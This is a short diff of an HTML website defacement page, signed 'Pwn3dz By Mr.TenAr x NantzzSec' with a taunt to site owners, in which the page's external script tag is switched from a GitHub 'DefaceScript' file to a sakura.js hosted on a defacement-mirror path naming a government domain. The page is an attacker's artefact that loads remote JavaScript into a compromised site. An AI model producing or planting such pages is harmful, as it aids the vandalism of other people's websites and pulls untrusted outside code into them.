@@ -67,6 +67,6 @@
 							<font size="5" style="color: white;">
 								<b><i><code>&hearts; Pwn3dz By Mr.TenAr x NantzzSec &hearts; </font>
 		 	 				 <br><br><h2 style="color: white;">~ I'm back to test how big your security force is, you can't stop me. ~<h2><br>
-			<script type="text/javascript" src="https://raw.githubusercontent.com/AryaSec1337/DefaceScript/refs/heads/main/sakura.js"></script>
+			<script type="text/javascript" src="http://zonehmirrors.org/defaced/2020/06/23/ardma.midanuttalim.com/suhunan.sukabumikab.go.id/sakura.js"></script>
 		 	 				</body>
 		 	 				 </html>
